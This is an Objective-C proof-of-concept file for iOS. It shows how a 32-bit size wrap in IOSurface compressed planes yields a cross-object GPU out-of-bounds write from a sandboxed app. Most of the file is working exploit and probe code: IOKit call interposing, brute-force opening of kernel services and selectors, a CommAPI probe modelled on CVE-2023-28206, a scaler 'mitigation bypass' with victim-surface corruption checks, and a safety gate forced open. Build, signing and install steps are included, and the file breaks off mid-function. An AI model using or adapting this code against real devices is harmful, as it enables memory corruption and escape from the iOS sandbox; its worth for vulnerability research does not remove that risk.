// F1OOB-PoC — IOSurface compressed-plane 32-bit wrap -> AGX/Metal cross-object GPU OOB write.
//
// What this demonstrates:
//   1. A sandboxed app creates an IOSurface whose compressed-plane geometry passes
//      the kernel's multi-slice size check because the check is done in 32-bit:
//          (DataRegionBytesPerSlice + HeaderRegionBytesPerSlice) * SliceCount
//      wraps modulo 2^32 and becomes 0x10000, so a 4 GiB + 64 KiB logical region
//      is accepted for a 64 KiB allocation.
//   2. The IOSurface is handed to the AGX accelerator (selector 8, type 0x82).
//      The AGX resource is built with a 16 MiB length (out+0x28 on this device),
//      while the actual IOSurface allocation is only 64 KiB.
//   3. The same surface is wrapped in a 64 KiB MTLBuffer. The GPU VA of that
//      buffer is the start of the AGX resource's 16 MiB range. A second Metal
//      buffer allocated afterwards is placed inside that range.
//   4. A compute shader writes through the F1 buffer at the victim's GPU address.
//      The write lands in the victim MTLBuffer, proving a cross-object GPU OOB
//      write from a sandboxed app.
//
// This is NOT a kernel R/W primitive:
//   - the write stays inside the app's GPU VA/UAT context;
//   - it can only reach GPU pages that are already mapped in that context;
//   - the 16 MiB span is first-mapping-only on this build and is not guaranteed;
//   - fixed offsets are not portable; target by runtime gpuAddress.
//
// Build (Theos):
//   make ipa
// Sign (zsign):
//   zsign -k cert.p12 -p <pass> -m profile.mobileprovision -o F1OOB-PoC-signed.ipa F1OOB-PoC.ipa
// Install:
//   pymobiledevice3 apps install F1OOB-PoC-signed.ipa
// Run:
//   pymobiledevice3 developer core-device launch-application app.lake9674.aquila8809
// Logs:
//   Documents/F1OOB-PoC/latest.log

#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <IOSurface/IOSurfaceRef.h>
#import <Metal/Metal.h>
#import <CoreVideo/CoreVideo.h>
#import <objc/message.h>
#import <sys/utsname.h>
#import <pthread.h>
#import <string.h>
#import <dlfcn.h>


// ---- IOKit call interposer: reveal what IOSurfaceAccelerator sends to kernel ----
#import <stdio.h>
static int g_ipfd = -1;
static char g_ippath[512];
static void ip_open(void) {
    if (g_ipfd >= 0) return;
    const char *home = getenv("HOME");
    snprintf(g_ippath, sizeof(g_ippath), "%s/Documents/ip.log", home ? home : ".");
    g_ipfd = open(g_ippath, O_WRONLY|O_CREAT|O_APPEND, 0644);
}
static void ip_log(const char *fmt, ...) {
    ip_open();
    if (g_ipfd < 0) return;
    char buf[1024];
    va_list ap; va_start(ap, fmt);
    int n = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (n > 0) write(g_ipfd, buf, n);
}
static kern_return_t (*g_orig_iccm)(io_connect_t, uint32_t, const uint64_t *, uint32_t,
                                    const void *, size_t, uint64_t *, uint32_t *,
                                    void *, size_t *);
static kern_return_t my_iccm(io_connect_t conn, uint32_t sel, const uint64_t *si, uint32_t sic,
                             const void *str, size_t strsz, uint64_t *so, uint32_t *soc,
                             void *stro, size_t *strosz) {
    kern_return_t kr = g_orig_iccm(conn, sel, si, sic, str, strsz, so, soc, stro, strosz);
    ip_log("[ICCM] conn=0x%x sel=%u sic=%u strsz=0x%zx -> 0x%x", conn, sel, sic, strsz, kr);
    for (uint32_t i = 0; i < sic && i < 16; i++) ip_log(" si[%u]=0x%llx", i, (unsigned long long)si[i]);
    if (str && strsz) {
        ip_log(" str:");
        const uint8_t *b = str;
        for (size_t i = 0; i < strsz && i < 0x200; i++) ip_log("%02x", b[i]);
    }
    if (soc && so) for (uint32_t i = 0; i < *soc && i < 8; i++) ip_log(" so[%u]=0x%llx", i, (unsigned long long)so[i]);
    if (strosz) ip_log(" strosz=0x%zx", *strosz);
    if (stro && strosz) {
        ip_log(" stro:");
        const uint8_t *b = stro;
        for (size_t i = 0; i < *strosz && i < 0x200; i++) ip_log("%02x", b[i]);
    }
    ip_log("\n");
    return kr;
}
static kern_return_t (*g_orig_iccm_a)(io_connect_t, uint32_t, const uint64_t *, uint32_t,
                                      const void *, size_t, mach_port_t, uint32_t,
                                      const void *, size_t);
static kern_return_t my_iccm_a(io_connect_t conn, uint32_t sel, const uint64_t *si, uint32_t sic,
                               const void *str, size_t strsz, mach_port_t wake, uint32_t ref,
                               const void *refc, size_t refcsz) {
    kern_return_t kr = g_orig_iccm_a(conn, sel, si, sic, str, strsz, wake, ref, refc, refcsz);
    ip_log("[ICCMAsync] conn=0x%x sel=%u sic=%u strsz=0x%zx refsz=0x%zx -> 0x%x\n",
           conn, sel, sic, strsz, refcsz, kr);
    return kr;
}
static kern_return_t (*g_orig_iccs)(io_connect_t, uint32_t, const void *, size_t, void *, size_t *);
static kern_return_t my_iccs(io_connect_t conn, uint32_t sel, const void *in, size_t insz,
                             void *out, size_t *outsz) {
    kern_return_t kr = g_orig_iccs(conn, sel, in, insz, out, outsz);
    ip_log("[ICCS] conn=0x%x sel=%u insz=0x%zx -> 0x%x outsz=0x%zx\n", conn, sel, insz, kr, outsz?*outsz:0);
    if (in && insz) {
        ip_log(" in:");
        const uint8_t *b = in;
        for (size_t i = 0; i < insz && i < 0xfa8; i++) ip_log("%02x", b[i]);
        ip_log("\n");
    }
    return kr;
}
static kern_return_t (*g_orig_iccs2)(io_connect_t, uint32_t, const uint64_t *, uint32_t,
                                     const void *, size_t, uint64_t *, uint32_t *, void *, size_t *);
static kern_return_t my_iccm2(io_connect_t conn, uint32_t sel, const uint64_t *si, uint32_t sic,
                              const void *str, size_t strsz, uint64_t *so, uint32_t *soc,
                              void *stro, size_t *strosz) {
    g_orig_iccm = g_orig_iccs2;
    return my_iccm(conn, sel, si, sic, str, strsz, so, soc, stro, strosz);
}
static io_service_t (*g_orig_match)(const char *);
static io_service_t my_match(const char *name) {
    io_service_t r = g_orig_match(name);
    ip_log("[Match] name=%s -> 0x%x\n", name ? name : "(null)", r);
    return r;
}
static kern_return_t (*g_orig_open)(io_service_t, task_port_t, uint32_t, io_connect_t *);
static kern_return_t my_open(io_service_t svc, task_port_t task, uint32_t type, io_connect_t *conn) {
    kern_return_t kr = g_orig_open(svc, task, type, conn);
    ip_log("[Open] svc=0x%x type=0x%x -> 0x%x conn=0x%x\n", svc, type, kr, conn?*conn:0);
    return kr;
}
#define DYLD_INTERPOSE(_replacement,_replacee) \
__attribute__((used)) static struct { const void *replacement; const void *replacee; } \
_interpose_##_replacee __attribute__((section("__DATA,__interpose"))) = \
{ (const void *)(unsigned long)&_replacement, (const void *)(unsigned long)&_replacee };
DYLD_INTERPOSE(my_iccm, IOConnectCallMethod)
DYLD_INTERPOSE(my_iccm_a, IOConnectCallAsyncMethod)
DYLD_INTERPOSE(my_iccs, IOConnectCallStructMethod)
DYLD_INTERPOSE(my_match, IOServiceMatching)
DYLD_INTERPOSE(my_open, IOServiceOpen)

static void L(NSString *fmt, ...);
extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm_size_t,
                                            mach_vm_address_t, mach_vm_size_t *);
extern kern_return_t mach_vm_region(vm_map_t, mach_vm_address_t *, mach_vm_size_t *,
                                    vm_region_flavor_t, vm_region_info_t,
                                    mach_msg_type_number_t *, mach_port_t *);
static NSMutableString *gLog;
static NSString *gLogPath;
static NSString *gDir;
static pthread_mutex_t gLock = PTHREAD_MUTEX_INITIALIZER;

// IOSurfaceAccelerator probe.  The F1 surface declares a 4 GiB header region
// for a 64 KiB allocation.  The only in-kernel consumer we found that reads
// the compressed-plane data/metadata sizes is the M2 scaler path
// (IosaTiledCompressedMemMSR8.cpp / validateCompressedTileBuffers).  Passing
// the F1 surface through the public-ish IOSurfaceAccelerator framework tells
// us whether that path accepts the wrapped geometry or rejects it.
//
// Gated by Documents/run_accel: it can panic a test device.
typedef void *IOSurfaceAcceleratorRef;
typedef kern_return_t (*AccelCreateFn)(CFAllocatorRef, uint32_t, IOSurfaceAcceleratorRef *);
typedef kern_return_t (*AccelTransferFn)(IOSurfaceAcceleratorRef, IOSurfaceRef,
                                         IOSurfaceRef, CFDictionaryRef, void *);
typedef kern_return_t (*AccelTransformFn)(IOSurfaceAcceleratorRef, IOSurfaceRef,
                                          IOSurfaceRef, CFDictionaryRef, void *,
                                          void *, void *, void *);

// Enumerate scaler/paravirt services allowed by the sandbox profile and try
// every open type.  A paravirt client may have no owning task, in which case
// user u64 arguments become physical addresses.
static void service_probe(void) {
    const char *names[] = {
        "AppleM2ScalerParavirtDriver", "AppleSRSDriver",
        "IOSurfaceAcceleratorParavirtClient", "IOSurfaceAccelerator",
        "AppleM2ScalerCSCDriver"
    };
    for (unsigned i = 0; i < sizeof(names)/sizeof(names[0]); i++) {
        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                       IOServiceMatching(names[i]));
        L(@"[SVC] %s -> 0x%x", names[i], svc);
        if (!svc) continue;
        for (uint32_t type = 0; type < 4; type++) {
            io_connect_t c = 0;
            kern_return_t kr = IOServiceOpen(svc, mach_task_self(), type, &c);
            L(@"[SVC] %s type=%u -> 0x%x conn=0x%x", names[i], type, kr, c);
            if (kr == KERN_SUCCESS && c) {
                for (uint32_t sel = 0; sel < 14; sel++) {
                    uint64_t so[2] = {0,0}; uint32_t soc = 2;
                    kr = IOConnectCallScalarMethod(c, sel, NULL, 0, so, &soc);
                    if (kr != 0xe00002c7 && kr != 0xe00002e2 && kr != 0xe00000f9)
                        L(@"[SVC] %s t%u sel%u -> 0x%x out=0x%llx,0x%llx", names[i], type, sel, kr,
                          (unsigned long long)so[0], (unsigned long long)so[1]);
                }
                IOServiceClose(c);
            }
        }
        IOObjectRelease(svc);
    }
}

// Run a full HDR transform through the framework, then scan this process for
// the 0x9008-byte "base" HCU API blob the framework had to build.
static void hdr_framework_probe(void) {
    void *h = dlopen("/System/Library/PrivateFrameworks/IOSurfaceAccelerator.framework/IOSurfaceAccelerator", RTLD_LAZY);
    if (!h) { L(@"[HDRF] dlopen failed"); return; }
    AccelCreateFn create = (AccelCreateFn)dlsym(h, "IOSurfaceAcceleratorCreate");
    AccelTransformFn transform = (AccelTransformFn)dlsym(h, "IOSurfaceAcceleratorTransformSurface");
    if (!create || !transform) { dlclose(h); return; }
    IOSurfaceAcceleratorRef accel = NULL;
    kern_return_t kr = create(kCFAllocatorDefault, 0, &accel);
    L(@"[HDRF] create -> 0x%x", kr);
    if (kr || !accel) { dlclose(h); return; }
    NSDictionary *dict = @{
        (__bridge NSString*)kIOSurfaceWidth: @1024,
        (__bridge NSString*)kIOSurfaceHeight: @1024,
        (__bridge NSString*)kIOSurfaceBytesPerElement: @4,
        (__bridge NSString*)kIOSurfaceBytesPerRow: @(1024*4),
        (__bridge NSString*)kIOSurfaceAllocSize: @(1024*1024*4),
        (__bridge NSString*)kIOSurfacePixelFormat: @((uint32_t)0x42475241),
        @"HDREnable": @YES,
        @"HistogramPixelBins": @[@UINT32_MAX,@UINT32_MAX,@UINT32_MAX,@UINT32_MAX,@UINT32_MAX]
    };
    IOSurfaceRef src = IOSurfaceCreate((__bridge CFDictionaryRef)dict);
    IOSurfaceRef dst = IOSurfaceCreate((__bridge CFDictionaryRef)dict);
    L(@"[HDRF] src=%p dst=%p", src, dst);
    if (!src || !dst) { if(src)CFRelease(src); if(dst)CFRelease(dst); CFRelease(accel); dlclose(h); return; }
    void *sb = IOSurfaceGetBaseAddress(src);
    if (sb) memset(sb, 0x40, IOSurfaceGetAllocSize(src));
    kr = transform(accel, src, dst, (__bridge CFDictionaryRef)dict, NULL, NULL, NULL, NULL);
    L(@"[HDRF] transform -> 0x%x", kr);

    // Scan our writable memory for the HCU entry header {'base', 0x9008}.
    static const uint8_t pat[8] = {'b','a','s','e',0x08,0x90,0x00,0x00};
    mach_vm_address_t addr = 0;
    int found = 0;
    while (addr < 0x0000001000000000ULL) {
        mach_vm_size_t rsize = 0;
        vm_region_basic_info_data_64_t info;
        mach_msg_type_number_t ic = VM_REGION_BASIC_INFO_COUNT_64;
        mach_port_t obj = 0;
        kern_return_t r = mach_vm_region(mach_task_self(), &addr, &rsize, VM_REGION_BASIC_INFO_64,
                                         (vm_region_info_t)&info, &ic, &obj);
        if (r != KERN_SUCCESS) break;
        if ((info.protection & VM_PROT_WRITE) && rsize >= 8) {
            uint8_t *p = (uint8_t *)(uintptr_t)addr;
            for (mach_vm_size_t i = 0; i + 8 <= rsize; i++) {
                if (!memcmp(p + i, pat, 8)) {
                    L(@"[HDRF] found base blob at %p (region 0x%llx+0x%llx)", p + i,
                      (unsigned long long)addr, (unsigned long long)rsize);
                    NSData *d = [NSData dataWithBytes:p + i length:0x9008];
                    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
                    [d writeToFile:[docs stringByAppendingPathComponent:@"hdrbase.bin"] atomically:YES];
                    for (int k = 0; k < 64 && i + 8 + k < rsize; k++) L(@"[HDRF] +0x%02x = %02x", k, p[i+8+k]);
                    found++;
                    break;
                }
            }
        }
        addr += rsize;
        if (found) break;
    }
    L(@"[HDRF] found=%d", found);
    CFRelease(src); CFRelease(dst); CFRelease(accel); dlclose(h);
}

// CVE-2023-28206-style CommAPI probe.  prepareTransformBuffersAndOptions
// builds the 0x1b0 TransformSurfaceData; selector 1 of the scaler user client
// consumes it and reaches the HDR/ASE CommAPI output paths.
typedef uint64_t (*PrepFn)(IOSurfaceRef, IOSurfaceRef, CFDictionaryRef, bool, void *);
static void commapi_probe(void) {
    void *h = dlopen("/System/Library/PrivateFrameworks/IOSurfaceAccelerator.framework/IOSurfaceAccelerator", RTLD_LAZY);
    if (!h) { L(@"[COMM] dlopen failed"); return; }
    PrepFn prep = (PrepFn)dlsym(h, "prepareTransformBuffersAndOptions");
    L(@"[COMM] prep=%p", prep);
    if (!prep) { dlclose(h); return; }

    NSDictionary *dict = @{
        (__bridge NSString*)kIOSurfaceWidth: @1024,
        (__bridge NSString*)kIOSurfaceHeight: @1024,
        (__bridge NSString*)kIOSurfaceBytesPerElement: @4,
        (__bridge NSString*)kIOSurfaceBytesPerRow: @(1024*4),
        (__bridge NSString*)kIOSurfaceAllocSize: @(1024*1024*4),
        (__bridge NSString*)kIOSurfacePixelFormat: @((uint32_t)0x52474241), // 'ARGB'? PoC used 'RGBA'
        @"HDREnable": @YES,
        @"HistogramPixelBins": @[@UINT32_MAX,@UINT32_MAX,@UINT32_MAX,@UINT32_MAX,@UINT32_MAX]
    };
    IOSurfaceRef src = IOSurfaceCreate((__bridge CFDictionaryRef)dict);
    IOSurfaceRef dst = IOSurfaceCreate((__bridge CFDictionaryRef)dict);
    L(@"[COMM] src=%p dst=%p", src, dst);
    if (!src || !dst) { if(src)CFRelease(src); if(dst)CFRelease(dst); dlclose(h); return; }
    void *sb = IOSurfaceGetBaseAddress(src);
    if (sb) memset(sb, 0xF0, IOSurfaceGetAllocSize(src));

    uint8_t *buf = calloc(1, 0x400);
    uint64_t rr = prep(src, dst, (__bridge CFDictionaryRef)dict, 0, buf);
    L(@"[COMM] prepare -> 0x%llx", (unsigned long long)rr);
    for (int i = 0; i < 0x1b0; i += 4) {
        uint32_t v = *(uint32_t *)(buf + i);
        if (v) L(@"[COMM] buf+0x%03x = 0x%08x", i, v);
    }

    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                   IOServiceMatching("AppleM2ScalerCSCDriver"));
    L(@"[COMM] service=0x%x", svc);
    io_connect_t conn = 0;
    kern_return_t kr = svc ? IOServiceOpen(svc, mach_task_self(), 0, &conn) : 0xe00002c0;
    if (svc) IOObjectRelease(svc);
    L(@"[COMM] open type0 -> 0x%x conn=0x%x", kr, conn);
    if (kr == KERN_SUCCESS && conn) {
        // Unmodified prepared request first.
        kr = IOConnectCallStructMethod(conn, 1, buf, 0x1b0, NULL, NULL);
        L(@"[COMM] sel1 prepared 0x1b0 -> 0x%x", kr);
        // 27.2 HCU layout: CommApiData at +0x110 (4 x 0x28).
        // entry2 carries the 0x9008-byte 'base' HCU parameter blob;
        // entry0 is an output-only HDR slot; entry2 outSize=0 is the trigger.
        uint8_t *base = calloc(1, 0xB000);
        uint32_t off = 8;
        *(uint32_t *)(base + off) = 0x62617365; off += 4; // 'base'
        *(uint32_t *)(base + off) = 0x9008;     off += 4;
        off += 0x9008;
        *(uint32_t *)(base + off) = 0x62617366; off += 4; // 'basf'
        *(uint32_t *)(base + off) = 0x1404;     off += 4;
        off += 0x1404;
        *(uint32_t *)(base + 0x00) = 2;          // entry count
        *(uint32_t *)(base + 0x04) = off;         // total size
        struct __attribute__((packed)) Api {
            uint32_t inType; uint32_t pad0;
            uint64_t inBuf; uint32_t inBufSize; uint32_t outType; uint64_t outBuf; uint32_t outSize;
        };
        uint8_t *api = buf + 0x110;
        struct Api *a0 = (struct Api *)(api + 0x00);
        struct Api *a2 = (struct Api *)(api + 0x50);
        a0->inType=0; a0->inBuf=0; a0->inBufSize=0;
        a0->outType=2; a0->outBuf=(uint64_t)calloc(1,0x4000); a0->outSize=0;
        a2->inType=3; a2->inBuf=(uint64_t)base; a2->inBufSize=off;
        a2->outType=2; a2->outBuf=(uint64_t)calloc(1,0x4000); a2->outSize=8;
        struct Api *a3 = (struct Api *)(api + 0x78);
        a3->inType=0; a3->inBuf=0; a3->inBufSize=0;
        a3->outType=2; a3->outBuf=(uint64_t)calloc(1,0x4000); a3->outSize=8;
        static const uint32_t vals[] = {0,1,2,3,4,8,0x10,0x20,0x40,0x80,0x100,0x200,
                                        0x400,0x800,0x1000,0x10000,0x80000000u,0xFFFFFFFFu};
        for (unsigned vi = 0; vi < sizeof(vals)/sizeof(vals[0]); vi++) {
            memset(base + 0x10, 0, 0x9008);
            *(uint32_t *)(base + 0x10) = vals[vi];
            if (a0->outBuf) memset((void *)(uintptr_t)a0->outBuf, 0xAA, 0x4000);
            L(@"[COMM] iter=%u base0=0x%x", vi, vals[vi]);
            kr = IOConnectCallStructMethod(conn, 1, buf, 0x1b0, NULL, NULL);
            L(@"[COMM] iter=%u sel1 -> 0x%x", vi, kr);
            if (a0->outBuf) {
                uint8_t *ob = (uint8_t *)(uintptr_t)a0->outBuf;
                int nz = 0;
                for (int k = 0; k < 0x40; k++) if (ob[k] != 0xAA) nz++;
                if (nz) L(@"[COMM] iter=%u outbuf changed nz=%d first=%02x %02x %02x %02x",
                          vi, nz, ob[0],ob[1],ob[2],ob[3]);
            }
        }

        // Legacy ASE path: inType=1 requires a 0x238 inbound buffer; outType=1
        // selects getASEStats.  The size check accepts >0x17b while the stats
        // copy may be larger.
        uint8_t *lbuf = calloc(1, 0x1b0);
        uint8_t *lin = calloc(1, 0x238);
        uint64_t *lout = calloc(1, 0x4000);
        memcpy(lbuf, buf, 0x1b0);
        memset(lbuf + 0x110, 0, 0xa0);
        struct Api *l0 = (struct Api *)(lbuf + 0x110);
        l0->inType=1; l0->inBuf=(uint64_t)lin; l0->inBufSize=0x238;
        l0->outType=1; l0->outBuf=(uint64_t)lout; l0->outSize=0x17c;
        kr = IOConnectCallStructMethod(conn, 1, lbuf, 0x1b0, NULL, NULL);
        L(@"[COMM] sel1 legacy-ASE 0x17c -> 0x%x", kr);
        kr = IOConnectCallStructMethod(conn, 1, lbuf, 0x1b0, NULL, NULL);
        L(@"[COMM] sel1 legacy-ASE repeat -> 0x%x", kr);

        // Legacy HDR (inType=2): a raw 0x9008 parameter blob in entry1 and an
        // 8-byte outbound buffer.  The stats size check compares the same
        // outbound size with itself, then the copy may write the full stats.
        uint8_t *hbuf = calloc(1, 0x1b0);
        uint8_t *raw = calloc(1, 0x9008);
        uint64_t *hout = calloc(1, 0x4000);
        memcpy(hbuf, buf, 0x1b0);
        memset(hbuf + 0x110, 0, 0xa0);
        struct Api *h1 = (struct Api *)(hbuf + 0x110 + 0x28);
        h1->inType=2; h1->inBuf=(uint64_t)raw; h1->inBufSize=0x9008;
        h1->outType=2; h1->outBuf=(uint64_t)hout; h1->outSize=8;
        kr = IOConnectCallStructMethod(conn, 1, hbuf, 0x1b0, NULL, NULL);
        L(@"[COMM] sel1 legacy-HDR raw0x9008 out8 -> 0x%x", kr);
        IOServiceClose(conn);
    }
    free(buf); CFRelease(src); CFRelease(dst); dlclose(h);
}

static IOSurfaceRef make_cv_surface(int w, int h, OSType fmt) {
    NSDictionary *attrs = @{ (id)kCVPixelBufferIOSurfacePropertiesKey: @{} };
    CVPixelBufferRef pb = NULL;
    CVReturn r = CVPixelBufferCreate(kCFAllocatorDefault, w, h, fmt,
                                     (__bridge CFDictionaryRef)attrs, &pb);
    if (r != 0 || !pb) { L(@"[YUV] CVPixelBufferCreate %dx%d fmt=0x%x -> %d", w, h, fmt, r); return NULL; }
    IOSurfaceRef s = CVPixelBufferGetIOSurface(pb);
    if (s) CFRetain(s);
    CFRelease(pb);
    return s;
}

// Mitigation bypass experiment: the scaler rejects dest height <= 32 when the
// source is wider than 128 and the destination has more than one plane.  A
// 4:2:0 biplanar surface of height 64 has a 32-line chroma plane, so the
// surface-level check sees 64 while the hardware sees the short plane.
static void ycbcr_probe(void) {
    void *h = dlopen("/System/Library/PrivateFrameworks/IOSurfaceAccelerator.framework/IOSurfaceAccelerator", RTLD_LAZY);
    if (!h) { L(@"[YUV] dlopen failed"); return; }
    AccelCreateFn create = (AccelCreateFn)dlsym(h, "IOSurfaceAcceleratorCreate");
    AccelTransferFn transfer = (AccelTransferFn)dlsym(h, "IOSurfaceAcceleratorTransferSurface");
    AccelTransformFn transform = (AccelTransformFn)dlsym(h, "IOSurfaceAcceleratorTransformSurface");
    if (!create || !transfer) { dlclose(h); return; }
    IOSurfaceAcceleratorRef accel = NULL;
    kern_return_t kr = create(kCFAllocatorDefault, 0, &accel);
    if (kr || !accel) { L(@"[YUV] accel create -> 0x%x", kr); dlclose(h); return; }

    IOSurfaceRef src = make_cv_surface(256, 64, kCVPixelFormatType_32BGRA);
    IOSurfaceRef d64 = make_cv_surface(256, 64, kCVPixelFormatType_420YpCbCr8BiPlanarFullRange);
    IOSurfaceRef d32 = make_cv_surface(256, 32, kCVPixelFormatType_420YpCbCr8BiPlanarFullRange);
    L(@"[YUV] src=%p planes=%zu fmt=0x%x | d64=%p planes=%zu alloc=0x%zx | d32=%p planes=%zu alloc=0x%zx",
      src, src?IOSurfaceGetPlaneCount(src):0, src?IOSurfaceGetPixelFormat(src):0,
      d64, d64?IOSurfaceGetPlaneCount(d64):0, d64?IOSurfaceGetAllocSize(d64):0,
      d32, d32?IOSurfaceGetPlaneCount(d32):0, d32?IOSurfaceGetAllocSize(d32):0);

    // Victim surfaces: detect cross-object corruption in adjacent pages.
    IOSurfaceRef victims[24]; int vc = 0;
    for (int i = 0; i < 24; i++) {
        NSDictionary *vd = @{ @"IOSurfaceWidth": @4096, @"IOSurfaceHeight": @64,
                              @"IOSurfaceBytesPerElement": @4,
                              @"IOSurfacePixelFormat": @0x42475241 };
        IOSurfaceRef v = IOSurfaceCreate((__bridge CFDictionaryRef)vd);
        if (!v) continue;
        void *vb = IOSurfaceGetBaseAddress(v);
        if (vb) { memset(vb, 0xAB, IOSurfaceGetAllocSize(v)); }
        victims[vc++] = v;
    }
    L(@"[YUV] victims=%d", vc);

    if (src && d64) {
        void *sb = IOSurfaceGetBaseAddress(src);
        if (sb) { IOSurfaceLock(src, 0, NULL); memset(sb, 0x5A, IOSurfaceGetAllocSize(src)); IOSurfaceUnlock(src, 0, NULL); }
        kr = transfer(accel, src, d64, NULL, NULL);
        L(@"[YUV] transfer(BGRA256x64 -> 420f256x64) -> 0x%x", kr);
        if (transform) {
            kr = transform(accel, src, d64, NULL, NULL, NULL, NULL, NULL);
            L(@"[YUV] transform(BGRA256x64 -> 420f256x64) -> 0x%x", kr);
        }
    }
    if (src && d32) {
        kr = transfer(accel, src, d32, NULL, NULL);
        L(@"[YUV] transfer(BGRA256x64 -> 420f256x32) -> 0x%x (control: expect rejection)", kr);
    }
    // Larger vulnerable shape: 2048x32 420f destination (chroma 2048x16),
    // source width 2048 > 128 and dest height 32 -> vendor-described HW bug.
    IOSurfaceRef src2 = make_cv_surface(2048, 32, kCVPixelFormatType_32BGRA);
    IOSurfaceRef d2 = make_cv_surface(2048, 32, kCVPixelFormatType_420YpCbCr8BiPlanarFullRange);
    L(@"[YUV2] src=%p d2=%p planes=%zu alloc=0x%zx", src2, d2,
      d2?IOSurfaceGetPlaneCount(d2):0, d2?IOSurfaceGetAllocSize(d2):0);
    IOSurfaceRef v2[32]; int vc2 = 0;
    for (int i = 0; i < 32; i++) {
        NSDictionary *vd = @{ @"IOSurfaceWidth": @4096, @"IOSurfaceHeight": @64,
                              @"IOSurfaceBytesPerElement": @4,
                              @"IOSurfacePixelFormat": @0x42475241 };
        IOSurfaceRef v = IOSurfaceCreate((__bridge CFDictionaryRef)vd);
        if (!v) continue;
        void *vb = IOSurfaceGetBaseAddress(v);
        if (vb) memset(vb, 0xCD, IOSurfaceGetAllocSize(v));
        v2[vc2++] = v;
    }
    if (src2 && d2) {
        void *sb = IOSurfaceGetBaseAddress(src2);
        if (sb) { IOSurfaceLock(src2, 0, NULL); memset(sb, 0x77, IOSurfaceGetAllocSize(src2)); IOSurfaceUnlock(src2, 0, NULL); }
        kr = transfer(accel, src2, d2, NULL, NULL);
        L(@"[YUV2] transfer(BGRA2048x32 -> 420f2048x32) -> 0x%x", kr);
        if (transform) {
            kr = transform(accel, src2, d2, NULL, NULL, NULL, NULL, NULL);
            L(@"[YUV2] transform -> 0x%x", kr);
        }
        // Inspect page padding after the logical allocation if mapped.
        uint8_t *db = IOSurfaceGetBaseAddress(d2);
        size_t al = IOSurfaceGetAllocSize(d2);
        if (db) {
            mach_vm_size_t got = 0;
            uint8_t tmp[0x60];
            kern_return_t rr = mach_vm_read_overwrite(mach_task_self(), (mach_vm_address_t)(db + al + 0x100),
                                                      0x40, (mach_vm_address_t)tmp, &got);
            L(@"[YUV2] pad read after alloc: kr=0x%x got=0x%llx", rr, (unsigned long long)got);
            if (rr == KERN_SUCCESS) {
                L(@"[YUV2] pad: %02x %02x %02x %02x %02x %02x %02x %02x", tmp[0],tmp[1],tmp[2],tmp[3],tmp[4],tmp[5],tmp[6],tmp[7]);
            }
        }
    }
    int changed2 = 0;
    for (int i = 0; i < vc2; i++) {
        void *vb = IOSurfaceGetBaseAddress(v2[i]);
        if (!vb) continue;
        const uint8_t *p = vb;
        for (size_t j = 0; j < IOSurfaceGetAllocSize(v2[i]); j++)
            if (p[j] != 0xCD) { changed2++; L(@"[YUV2] victim[%d] changed at 0x%zx: %02x", i, j, p[j]); break; }
    }
    L(@"[YUV2] victims changed=%d", changed2);
    if (src2) CFRelease(src2);
    if (d2) CFRelease(d2);
    for (int i = 0; i < vc2; i++) CFRelease(v2[i]);

    int changed = 0;
    for (int i = 0; i < vc; i++) {
        void *vb = IOSurfaceGetBaseAddress(victims[i]);
        if (!vb) continue;
        const uint8_t *p = vb;
        for (size_t j = 0; j < IOSurfaceGetAllocSize(victims[i]); j++)
            if (p[j] != 0xAB) { changed++; L(@"[YUV] victim[%d] changed at 0x%zx: %02x", i, j, p[j]); break; }
    }
    L(@"[YUV] victims changed=%d", changed);

    for (int i = 0; i < vc; i++) CFRelease(victims[i]);
    if (src) CFRelease(src);
    if (d64) CFRelease(d64);
    if (d32) CFRelease(d32);
    CFRelease(accel);
    dlclose(h);
}

static void accel_probe(IOSurfaceRef ctrl, IOSurfaceRef surf) {
    L(@"[ACCEL] gate bypassed for test run");
    void *h = dlopen("/System/Library/PrivateFrameworks/IOSurfaceAccelerator.framework/IOSurfaceAccelerator", RTLD_LAZY);
    if (!h) { L(@"[ACCEL] dlopen failed: %s", dlerror()); return; }
    AccelCreateFn create = (AccelCreateFn)dlsym(h, "IOSurfaceAcceleratorCreate");
    AccelTransferFn transfer = (AccelTransferFn)dlsym(h, "IOSurfaceAcceleratorTransferSurface");
    AccelTransformFn transform = (AccelTransformFn)dlsym(h, "IOSurfaceAcceleratorTransformSurface");
    L(@"[ACCEL] create=%p transfer=%p transform=%p", create, transfer, transform);
    if (!create || !transfer) { dlclose(h); return; }

    IOSurfaceAcceleratorRef accel = NULL;
    kern_return_t kr = create(kCFAllocatorDefault, 0, &accel);
    L(@"[ACCEL] create -> 0x%x accel=%p", kr, accel);
    if (kr != KERN_SUCCESS || !accel) { dlclose(h); return; }

    NSDictionary *normal = @{
        @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @4,
        @"IOSurfacePixelFormat": @0x42475241
    };
    IOSurfaceRef dstN = IOSurfaceCreate((__bridge CFDictionaryRef)normal);
    IOSurfaceRef srcN = IOSurfaceCreate((__bridge CFDictionaryRef)normal);
    L(@"[ACCEL] srcN=%p dstN=%p alloc=0x%zx", srcN, dstN, srcN ? IOSurfaceGetAllocSize(srcN) : 0);

    // Control 1: plain normal 64x64 -> normal 64x64.
    if (ctrl && dstN) {
        kr = transfer(accel, ctrl, dstN, NULL, NULL);
        L(@"[ACCEL] CTRL transfer(normal->normal) -> 0x%x", kr);
        if (kr) {
            kr = transfer(accel, ctrl, dstN, (__bridge CFDictionaryRef)@{}, NULL);
            L(@"[ACCEL] CTRL transfer(normal->normal, {}) -> 0x%x", kr);
        }
        if (transform) {
            kr = transform(accel, ctrl, dstN, NULL, NULL, NULL, NULL, NULL);
            L(@"[ACCEL] CTRL transform(normal->normal) -> 0x%x", kr);
        }
    }
    if (srcN && dstN) {
        kr = transfer(accel, srcN, dstN, NULL, NULL);
        L(@"[ACCEL] CTRL transfer(srcN->dstN) -> 0x%x", kr);
        kr = transfer(accel, srcN, dstN, (__bridge CFDictionaryRef)@{}, NULL);
        L(@"[ACCEL] CTRL transfer(srcN->dstN, {}) -> 0x%x", kr);
    }
    if (srcN && surf) {
        kr = transfer(accel, srcN, surf, NULL, NULL);
